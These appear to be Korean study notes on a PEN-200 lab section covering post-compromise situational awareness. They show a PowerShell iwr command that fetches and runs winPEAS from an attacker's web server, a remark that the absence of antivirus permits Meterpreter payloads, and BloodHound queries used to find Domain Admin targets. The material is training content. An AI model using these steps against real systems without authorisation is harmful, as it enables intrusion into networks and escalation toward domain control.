# 27.4.1 상황 파악

> **Situational Awareness** · PEN-200 §27.4.1

순서는 둘 — 먼저 CLIENTWK1 자체를 로컬 열거해 시스템 개요와 값나가는 데이터를 찾고, 이어 도메인의 사용자·컴퓨터·도메인 관리자·이동 경로를 열거함. 교재 진행에서는 모든 결과를 작업 디렉터리에 적지는 않지만, 기록 습관을 들이려면 따라가면서 발견 사항을 전부 노트로 남길 것.

로컬 열거는 winPEAS 로 시작함. 8000 포트로 서빙 중인 웹서버에서 64비트 실행 파일을 내려받아 marcus 홈에서 실행.

```
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
cd C:\Users\marcus
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile
winPEAS.exe
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
...
```

*winPEAS 다운로드 및 실행*

⚠️ **함정** — winPEAS 의 Basic System Information 은 OS 를 `Windows 10 Pro` 로 보고함. 그러나 winPEAS 는 Windows 11 을 10 으로 오탐하는 알려진 습성이 있어 `systeminfo` 로 직접 확인해야 함.

*실제 OS 는 Windows 11 — 자동 도구 결과를 그대로 믿었으면 초반 전제가 통째로 틀어졌음*

나머지 winPEAS 결과에서 얻은 것:

- **AV 미탐지** — Meterpreter 같은 페이로드를 부담 없이 쓸 수 있음
- **네트워크** — 인터페이스 172.16.6.243/24, 게이트웨이 172.16.6.254, DNS 172.16.6.240

*이 시점의 `computer.txt` — 아직 INTERNALSRV1 은 모르는 상태임*

권한 상승으로 이어질 재료는 나오지 않음. 다만 여기는 CTF 가 아니라 모의 진단이라 **모든 머신에서 관리자 권한을 딸 필요는 없음**. 실제 진단에서는 winPEAS 출력을 건너뛰지 말고 정독해 Windows 권한 상승 모듈의 상황 파악 항목을 채워야 하고, 비밀번호 관리자 같은 추가 먹잇감도 여기서 확인함. 로컬에 더 볼 것이 없으면 도메인 열거로 넘어감.

Kali 로 옮긴 뒤 neo4j·BloodHound 를 띄우고 Upload Data 로 적재.

BloodHound 는 Cypher 로 작성된 사전 정의 질의(예: Find all Domain Admins)를 갖고 있으나, 사용자·컴퓨터 «전체 목록» 같은 기본 열거는 사전 질의에 없어 Raw Query 로 직접 씀. `MATCH` 로 객체 집합을 고르고 변수에 담아 `RETURN` 으로 그래프를 그림.

```
MATCH (m:Computer) RETURN m
```

*식별된 대상 머신 기록*

같은 질의에서 `Computer` 를 `User` 로 바꾸면 사용자 객체가 나옴 — 기본 계정 외에 넷.

```
BECCY
JOHN
DANIELA
MARCUS
```
*기본 계정을 제외한 도메인 사용자 넷*
 john·marcus 는 이미 유효 도메인 사용자로 확인됐고, daniela 는 WEBSRV1 로컬 계정인지 도메인 계정인지가 그때까지 미확정이었는데 여기서 도메인 사용자 객체로 잡힘. 신규 계정 beccy 도 이 목록에서 처음 나옴. 셸을 쥔 marcus 와 자격 증명을 쥔 john 은 노드 우클릭 → Mark User as Owned 로 표시해 둠(일부 사전 질의가 이 표시를 전제로 동작함).

사전 질의 Find all Domain Admins 결과 — 기본 Administrator 외에 **beccy 가 Domain Admins 소속** → 최우선 표적.

![[PEN200-Fig-372.png]]

*도메인 관리자 조회 결과 — beccy 가 Domain Admins 에 속함*

이어 돌린 사전 질의 넷은 전부 무소득 — Find Workstations where Domain Users can RDP · Find Servers where Domain Users can RDP · Find Computers where Domain Users are Local Admin · Shortest Path to Domain Admins from Owned Principals. 즉 RDP 로그인 가능한 머신 없음, 도메인 사용자가 로컬 관리자인 머신 없음, 소유 계정에서 Domain Admins 로 가는 직행 경로 없음 → **john·marcus 로는 어떤 도메인 컴퓨터에도 특권 접근이 없다**는 것을 배제로 확정한 셈임.

PowerView 나 LDAP 질의로도 같은 정보를 얻을 수 있으나 출력량이 압도적이라, 대개 BloodHound 를 먼저 돌려 짧은 시간에 구조를 잡는 것이 낫음. 실제 진단이라면 도메인 그룹과 GPO 열거도 반드시 포함할 것.
